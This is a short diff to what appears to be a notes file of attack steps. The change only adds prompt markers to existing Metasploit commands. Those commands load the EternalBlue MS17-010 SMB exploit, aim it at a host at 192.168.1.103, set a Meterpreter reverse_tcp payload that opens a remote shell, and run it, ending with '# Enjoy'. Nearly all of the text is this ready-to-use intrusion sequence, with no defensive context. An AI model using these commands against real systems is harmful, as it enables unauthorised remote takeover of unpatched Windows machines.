@@ -14,9 +14,9 @@ service postgresql start
 msfconsole
 
 # Exploit in Metasploit
-use exploit/windows/smb/ms17_010_eternalblue.rb
-set RHOST 192.168.1.103
-set payload windows/x64/meterpreter/reverse_tcp
-exploit
+> use exploit/windows/smb/ms17_010_eternalblue.rb
+> set RHOST 192.168.1.103
+> set payload windows/x64/meterpreter/reverse_tcp
+> exploit
 
 # Enjoy
